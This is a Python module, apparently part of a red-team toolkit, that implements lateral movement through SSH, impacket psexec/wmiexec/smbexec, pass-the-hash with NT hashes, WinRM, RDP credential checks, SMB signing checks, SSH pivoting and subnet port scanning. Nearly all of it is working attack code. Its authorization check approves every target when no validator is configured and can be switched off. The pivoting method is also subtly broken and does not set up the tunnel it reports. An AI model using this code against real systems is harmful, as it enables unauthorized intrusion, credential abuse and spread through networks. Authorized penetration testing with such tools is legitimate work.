"""RED TEAM - Lateral Movement
AUTHORIZED USE ONLY - For penetration testing in controlled lab environments
"""
import logging
import subprocess
import os
import socket
import time
from typing import Dict, List, Optional, Any
from datetime import datetime
import paramiko

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.LateralMovement")

class LateralMovement:
    """
    Lateral movement techniques for authorized penetration testing.
    All methods require proper authorization and scope validation.
    """

    def __init__(self, scope_validator=None, authorization_required=True):
        self.logger = logger
        self.authorization_required = authorization_required
        self.scope_validator = scope_validator
        self.logger.info("LateralMovement module initialized - AUTHORIZED PENTESTING ONLY")

    def _check_authorization(self, target: str, method: str) -> bool:
        """Validate authorization before executing lateral movement"""
        if not self.authorization_required:
            self.logger.warning(f"Authorization bypassed for {method} on {target}")
            return True

        if self.scope_validator:
            authorized = self.scope_validator.validate(target, method)
            if not authorized:
                raise PermissionError(f"Target {target} not in authorized scope for {method}")
            return True

        self.logger.warning("No scope validator configured - assuming authorized")
        return True

    def ssh_lateral(self, target_ip: str, username: str, password: str = None,
                    key_file: str = None, command: str = None) -> Dict[str, Any]:
        """
        Lateral movement via SSH
        Tests SSH credential reuse and privilege escalation
        """
        self._check_authorization(target_ip, "ssh_lateral")

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Connect via password or key
            if key_file:
                client.connect(target_ip, username=username, key_filename=key_file, timeout=10)
            elif password:
                client.connect(target_ip, username=username, password=password, timeout=10)
            else:
                return {"method": "ssh", "status": "failed", "error": "No authentication method"}

            # Execute command if provided
            result = {"method": "ssh_lateral", "status": "connected", "target": target_ip, "username": username}

            if command:
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.read().decode()
                error = stderr.read().decode()
                exit_code = stdout.channel.recv_exit_status()

                result.update({
                    "command": command,
                    "output": output[:1000],
                    "error": error[:500],
                    "exit_code": exit_code
                })

            client.close()
            return result

        except Exception as e:
            self.logger.error(f"SSH lateral movement failed: {e}")
            return {"method": "ssh", "status": "failed", "error": str(e)}

    def psexec_lateral(self, target_ip: str, username: str, password: str,
                       command: str = "whoami") -> Dict[str, Any]:
        """
        Lateral movement via PsExec (SMB-based command execution)
        Tests SMB authentication and remote execution
        """
        self._check_authorization(target_ip, "psexec")

        try:
            # Use impacket's psexec.py for remote execution
            cmd = [
                "python3", "-m", "impacket.psexec",
                f"{username}:{password}@{target_ip}",
                command
            ]

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            return {
                "method": "psexec_lateral",
                "status": "complete" if proc.returncode == 0 else "failed",
                "target": target_ip,
                "username": username,
                "command": command,
                "output": proc.stdout[:1000],
                "error": proc.stderr[:500],
                "exit_code": proc.returncode
            }

        except subprocess.TimeoutExpired:
            return {"method": "psexec", "status": "timeout", "target": target_ip}
        except Exception as e:
            self.logger.error(f"PsExec lateral movement failed: {e}")
            return {"method": "psexec", "status": "failed", "error": str(e)}

    def wmi_lateral(self, target_ip: str, username: str, password: str,
                    command: str = "whoami") -> Dict[str, Any]:
        """
        Lateral movement via WMI (Windows Management Instrumentation)
        Tests WMI remote execution capabilities
        """
        self._check_authorization(target_ip, "wmi")

        try:
            # Use impacket's wmiexec.py
            cmd = [
                "python3", "-m", "impacket.wmiexec",
                f"{username}:{password}@{target_ip}",
                command
            ]

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            return {
                "method": "wmi_lateral",
                "status": "complete" if proc.returncode == 0 else "failed",
                "target": target_ip,
                "username": username,
                "command": command,
                "output": proc.stdout[:1000],
                "error": proc.stderr[:500],
                "exit_code": proc.returncode
            }

        except subprocess.TimeoutExpired:
            return {"method": "wmi", "status": "timeout", "target": target_ip}
        except Exception as e:
            self.logger.error(f"WMI lateral movement failed: {e}")
            return {"method": "wmi", "status": "failed", "error": str(e)}

    def rdp_lateral(self, target_ip: str, username: str, password: str,
                    test_only: bool = True) -> Dict[str, Any]:
        """
        Test RDP access for lateral movement
        Tests RDP credential validity and access
        """
        self._check_authorization(target_ip, "rdp")

        try:
            # Test RDP port accessibility
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()

            if result != 0:
                return {
                    "method": "rdp_lateral",
                    "status": "port_closed",
                    "target": target_ip,
                    "port": 3389
                }

            # Use xfreerdp for actual connection test if not test_only
            if not test_only:
                cmd = [
                    "xfreerdp",
                    f"/v:{target_ip}",
                    f"/u:{username}",
                    f"/p:{password}",
                    "/cert-ignore",
                    "+auth-only"
                ]

                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

                return {
                    "method": "rdp_lateral",
                    "status": "authenticated" if proc.returncode == 0 else "auth_failed",
                    "target": target_ip,
                    "username": username,
                    "port": 3389
                }

            return {
                "method": "rdp_lateral",
                "status": "port_open",
                "target": target_ip,
                "port": 3389,
                "note": "Set test_only=False for authentication test"
            }

        except Exception as e:
            self.logger.error(f"RDP lateral movement test failed: {e}")
            return {"method": "rdp", "status": "failed", "error": str(e)}

    def smb_relay(self, target_ip: str, relay_server: str, username: str = None) -> Dict[str, Any]:
        """
        SMB relay attack simulation
        Tests SMB signing requirements and relay prevention
        """
        self._check_authorization(target_ip, "smb_relay")

        try:
            # Check SMB signing status
            cmd = ["nmap", "-p", "445", "--script", "smb-security-mode", target_ip]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            signing_required = "signing_required: true" in proc.stdout.lower()

            return {
                "method": "smb_relay",
                "status": "signing_check_complete",
                "target": target_ip,
                "smb_signing_required": signing_required,
                "relay_vulnerable": not signing_required,
                "scan_output": proc.stdout[:500],
                "note": "SMB signing blocks relay attacks" if signing_required else "SMB relay may be possible"
            }

        except Exception as e:
            self.logger.error(f"SMB relay test failed: {e}")
            return {"method": "smb_relay", "status": "failed", "error": str(e)}

    def pass_the_hash(self, target_ip: str, username: str, nt_hash: str,
                      command: str = "whoami") -> Dict[str, Any]:
        """
        Pass-the-hash attack for lateral movement
        Tests NTLM hash authentication vulnerabilities
        """
        self._check_authorization(target_ip, "pass_the_hash")

        try:
            # Use impacket's smbexec with hash
            cmd = [
                "python3", "-m", "impacket.smbexec",
                "-hashes", f":{nt_hash}",
                f"{username}@{target_ip}",
                command
            ]

            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            return {
                "method": "pass_the_hash",
                "status": "complete" if proc.returncode == 0 else "failed",
                "target": target_ip,
                "username": username,
                "command": command,
                "output": proc.stdout[:1000],
                "error": proc.stderr[:500],
                "hash_accepted": proc.returncode == 0
            }

        except Exception as e:
            self.logger.error(f"Pass-the-hash failed: {e}")
            return {"method": "pass_the_hash", "status": "failed", "error": str(e)}

    def winrm_lateral(self, target_ip: str, username: str, password: str,
                      command: str = "whoami") -> Dict[str, Any]:
        """
        Lateral movement via WinRM
        Tests Windows Remote Management access
        """
        self._check_authorization(target_ip, "winrm")

        try:
            # Use evil-winrm or pywinrm
            from winrm import Session

            session = Session(f'http://{target_ip}:5985/wsman', auth=(username, password))
            result = session.run_cmd(command)

            return {
                "method": "winrm_lateral",
                "status": "complete" if result.status_code == 0 else "failed",
                "target": target_ip,
                "username": username,
                "command": command,
                "output": result.std_out.decode()[:1000],
                "error": result.std_err.decode()[:500],
                "exit_code": result.status_code
            }

        except Exception as e:
            self.logger.error(f"WinRM lateral movement failed: {e}")
            return {"method": "winrm", "status": "failed", "error": str(e)}

    def pivoting_setup(self, pivot_host: str, pivot_user: str, pivot_pass: str,
                       local_port: int, target_host: str, target_port: int) -> Dict[str, Any]:
        """
        Setup SSH tunneling for network pivoting
        Tests ability to pivot through compromised hosts
        """
        self._check_authorization(pivot_host, "pivoting")

        try:
            # Create SSH tunnel using paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(pivot_host, username=pivot_user, password=pivot_pass, timeout=10)

            # Setup port forwarding
            transport = client.get_transport()
            transport.request_port_forward('', local_port)

            return {
                "method": "ssh_pivoting",
                "status": "tunnel_established",
                "pivot_host": pivot_host,
                "local_port": local_port,
                "target_host": target_host,
                "target_port": target_port,
                "note": "Tunnel active - use localhost:{local_port} to reach {target_host}:{target_port}"
            }

        except Exception as e:
            self.logger.error(f"Pivoting setup failed: {e}")
            return {"method": "pivoting", "status": "failed", "error": str(e)}

    def detect_lateral_paths(self, current_host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        Detect possible lateral movement paths from current host
        Scans for accessible hosts using current credentials
        """
        self._check_authorization(current_host, "path_detection")

        try:
            # Get network range (simplified - scan local subnet)
            import ipaddress
            import concurrent.futures

            # Parse current host IP
            ip = ipaddress.ip_address(current_host)
            network = ipaddress.ip_network(f"{ip}/24", strict=False)

            accessible_hosts = []

            def test_host(target_ip):
                # Quick SMB/SSH port check
                for port in [22, 445, 3389, 5985]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        if sock.connect_ex((str(target_ip), port)) == 0:
                            return {"ip": str(target_ip), "port": port, "service": {22: "SSH", 445: "SMB", 3389: "RDP", 5985: "WinRM"}[port]}
                        sock.close()
                    except:
                        pass
                return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(test_host, network.hosts())
                accessible_hosts = [r for r in results if r is not None]

            return {
                "method": "lateral_path_detection",
                "status": "complete",
                "current_host": current_host,
                "network_scanned": str(network),
                "accessible_hosts": len(accessible_hosts),
                "hosts": accessible_hosts[:20],  # Limit output
                "note": f"Found {len(accessible_hosts)} potentially accessible hosts"
            }

        except Exception as e:
            self.logger.error(f"Lateral path detection failed: {e}")
            return {"method": "path_detection", "status": "failed", "error": str(e)}

    def get_capabilities(self) -> List[str]:
        """Return list of available lateral movement methods"""
        return [
            "ssh_lateral",
            "psexec_lateral",
            "wmi_lateral",
            "rdp_lateral",
            "smb_relay",
            "pass_the_hash",
            "winrm_lateral",
            "pivoting_setup",
            "detect_lateral_paths"
        ]

__all__ = ["LateralMovement"]
